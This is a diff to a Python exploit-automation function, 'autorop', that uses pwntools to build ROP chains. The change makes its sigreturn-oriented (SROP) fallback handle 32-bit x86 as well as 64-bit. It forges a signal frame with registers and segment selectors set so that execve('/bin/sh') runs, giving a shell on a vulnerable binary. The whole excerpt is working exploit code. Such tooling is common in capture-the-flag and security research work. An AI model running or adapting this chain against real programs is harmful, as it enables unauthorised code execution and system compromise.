@@ -445,23 +445,46 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
     # 4) explicit SROP fallback: a fake sigcontext (rt_sigreturn, RAX=15) sets ALL registers at
     #    once, so it needs only `pop rax; ret` + a syscall gadget -- no pop rdi/rsi/rdx. Used when
     #    the execve chain can't satisfy the arg registers. Needs an in-memory "/bin/sh" (binsh).
-    if not built and binsh is not None and not is32:   # SROP aqui es x86-64 (frame.rax/rdi/rsi/rdx)
+    # 4) explicit SROP fallback: a fake sigcontext sets ALL registers at once, so it needs only
+    #    `pop {r,e}ax; ret` + a syscall gate -- no pop rdi/rsi/rdx. Used when the execve chain
+    #    can't satisfy the arg registers. Needs an in-memory "/bin/sh" (binsh). Arch-aware.
+    if not built and binsh is not None:
         try:
             from pwn import SigreturnFrame
             rop = ROP(elf)
-            pop_rax = rop.find_gadget(["pop rax", "ret"])
-            sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
-            if pop_rax and sc:
-                frame = SigreturnFrame()
-                frame.rax = 0x3b                 # execve
-                frame.rdi = binsh
-                frame.rsi = 0
-                frame.rdx = 0
-                frame.rip = sc.address           # the frame's RIP runs execve('/bin/sh', 0, 0)
-                rop.raw(pop_rax.address); rop.raw(15)   # RAX = 15 (rt_sigreturn)
-                rop.raw(sc.address)                     # syscall -> rt_sigreturn consumes the frame
-                rop.raw(bytes(frame))
-                built = True; strategy = "SROP (sigreturn execve)"
+            if is32:
+                # x86-32: sigreturn is syscall 119 (0x77) via `int 0x80`; the restored frame runs
+                # execve (eax=11) with ebx=&binsh, triggered by the frame's eip = int 0x80 gate.
+                pop_ax = rop.find_gadget(["pop eax", "ret"])
+                sc = rop.find_gadget(["int 0x80"])
+                if pop_ax and sc:
+                    frame = SigreturnFrame(kernel="i386")   # i386 frame needs the kernel arch
+                    frame.eax = 0x0b                 # execve
+                    frame.ebx = binsh
+                    frame.ecx = 0
+                    frame.edx = 0
+                    frame.eip = sc.address
+                    # modern Linux i386 user segments (pwntools defaults to legacy 0x73/0x7b/0)
+                    frame.cs = 0x23; frame.ss = 0x2b; frame.ds = 0x2b
+                    frame.es = 0x2b; frame.gs = 0x63; frame.fs = 0
+                    rop.raw(pop_ax.address); rop.raw(0x77)   # EAX = 119 (sigreturn)
+                    rop.raw(sc.address)                      # int 0x80 -> sigreturn consumes the frame
+                    rop.raw(bytes(frame))
+                    built = True; strategy = "SROP (sigreturn execve, x86-32)"
+            else:
+                pop_rax = rop.find_gadget(["pop rax", "ret"])
+                sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
+                if pop_rax and sc:
+                    frame = SigreturnFrame()
+                    frame.rax = 0x3b                 # execve
+                    frame.rdi = binsh
+                    frame.rsi = 0
+                    frame.rdx = 0
+                    frame.rip = sc.address           # the frame's RIP runs execve('/bin/sh', 0, 0)
+                    rop.raw(pop_rax.address); rop.raw(15)   # RAX = 15 (rt_sigreturn)
+                    rop.raw(sc.address)                     # syscall -> rt_sigreturn consumes the frame
+                    rop.raw(bytes(frame))
+                    built = True; strategy = "SROP (sigreturn execve)"
         except Exception:
             pass
     if not built:
